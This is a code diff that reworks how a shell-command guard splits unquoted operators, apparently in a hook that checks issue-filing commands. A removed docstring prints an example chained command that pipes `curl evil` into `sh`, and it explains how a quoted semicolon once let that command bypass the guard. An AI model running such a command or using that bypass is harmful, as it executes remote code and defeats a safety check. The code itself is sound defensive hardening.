@@ -1055,89 +1055,50 @@ def strip_heredocs(text):
     return "\n".join(output)
 
 
-def quoted_token_mask(text, expected):
-    """Which token POSITIONS were quoted in the source.
-
-    shlex strips quotes, so by the time a token is in hand there is no way to
-    tell `--title "a; b"` from `a` `;` `b`. This asks the source instead.
-
-    A quoted token is DATA and must never be exploded on shell operators. An
-    unquoted one may be `true&&gh`, where the operator is structural and hiding
-    a command. That is the entire distinction.
-
-    It must be answered PER OCCURRENCE, not per token value. Asking "does the
-    text contain a quoted `;`?" classifies every `;` in the command by whether
-    ANY of them was quoted, so
-
-        gh issue create --title x --body ";" ; curl evil | sh
-
-    exempted the real chaining semicolon because a different, quoted one
-    appeared in --body. That is a bypass of this guard, not a nuisance: the
-    exemption added to stop a false refusal became the way through.
-
-    Lexing the same text a second time with `posix=False` preserves the quote
-    characters while producing the same tokens in the same order, so position
-    `i` answers for occurrence `i` and nothing else.
-
-    Args:
-        text: The original command string.
-        expected: Token count from the posix lex, used to prove alignment.
-
-    Returns:
-        A list of booleans, one per token. Empty when the two lexes disagree,
-        which exempts nothing — an unreadable command must not be trusted.
-    """
-    try:
-        raw = shlex.split(text, posix=False)
-    except ValueError:
-        return []
-    # Alignment is the whole basis for indexing one lex by the other's
-    # positions. If the two disagree, fail closed rather than exempt the wrong
-    # token: a missed exemption is a false refusal, a wrong one is a bypass.
-    if len(raw) != expected:
-        return []
-    return [token[:1] in ('"', "'") for token in raw]
+class LiteralToken(str):
+    """A source word containing quoted data, never a standalone separator."""
 
 
 def explode_operators(tokens, text=""):
-    """Split shell control operators glued to adjacent words.
+    """Separate unquoted operators without losing mixed-word quote boundaries.
 
-    `true&&gh issue create` tokenises as one word `true&&gh`, whose basename is
-    not `gh`, so the creation hid behind the operator. Splitting them out means
-    an operator can never be load-bearing punctuation inside a token.
-
-    QUOTED tokens are exempt BY POSITION, and that exemption is the fix for a
-    measured false refusal: a `--title "Trim config; org preference"` was split on its
-    semicolon, the `--label status:ready` landed in a different segment from the
-    `gh issue create`, and the guard refused a correctly-formed filing while
-    telling the author to add the label they had already added. Recorded on
-    CodySwannGT/lisa#2634 after it blocked a real filing.
-
-    `shlex.shlex(punctuation_chars=True)` is NOT the fix and was measured: it
-    tokenises the glued case correctly but shatters a GraphQL payload —
-    `query=mutation{issueCreate(input:{})}` becomes three fragments — which is
-    the exact regression the GLUED_OPERATORS comment above records as having
-    silently un-refused every GraphQL creation.
-
-    Args:
-        tokens: Tokens from shlex.
-        text: The original command string, used to detect quoting.
-
-    Returns:
-        Tokens with operators separated out.
+    Hide each quoted or escaped source fragment before the ordinary shlex pass.
+    Split operators while those fragments are opaque, then restore their values.
+    Per-occurrence placeholders cannot exempt a different, unquoted separator.
     """
-    pattern = re.compile(
-        "(" + "|".join(re.escape(op) for op in GLUED_OPERATORS) + ")"
-    )
+    operators = re.compile("(" + "|".join(re.escape(op) for op in GLUED_OPERATORS) + ")")
+    if not text:
+        return [piece for token in tokens for piece in operators.split(token) if piece]
+
+    prefix = "__lisa_literal_"
+    while prefix in text:
+        prefix += "_"
+    values = []
+    fragments = re.compile(r"""'[^']*'|"(?:\\[\s\S]|[^"\\])*"|\\[\s\S]""")
+
+    def hide(match):
+        """Decode one protected fragment through the same POSIX lexer."""
+        value = shlex.split(match.group(0), posix=True)
+        values.append(value[0] if value else "")
+        return prefix + str(len(values) - 1) + "__"
+
+    masked = fragments.sub(hide, text)
+    marker = re.compile(re.escape(prefix) + r"(\d+)__")
+
+    def restore(value):
+        """Restore once, so decoded text cannot become another placeholder."""
+        return marker.sub(lambda match: values[int(match.group(1))], value)
+
+    shadow = shlex.split(masked, posix=True)
+    if [restore(token) for token in shadow] != tokens:
+        # If alignment cannot be established, grant no quoting exemptions.
+        return [piece for token in tokens for piece in operators.split(token) if piece]
+
     exploded = []
-    quoted = quoted_token_mask(text, len(tokens)) if text else []
-    for index, token in enumerate(tokens):
-        if index < len(quoted) and quoted[index]:
-            exploded.append(token)
-            continue
-        for piece in pattern.split(token):
+    for token in shadow:
+        for piece in operators.split(token):
             if piece:
-                exploded.append(piece)
+                exploded.append(LiteralToken(restore(piece)) if marker.search(piece) else piece)
     return exploded
 
 
@@ -1153,7 +1114,7 @@ def segment(tokens):
     segments = []
     current = []
     for token in tokens:
-        if token in SEGMENT_BOUNDARIES:
+        if token in SEGMENT_BOUNDARIES and not isinstance(token, LiteralToken):
             segments.append(current)
             current = []
             continue
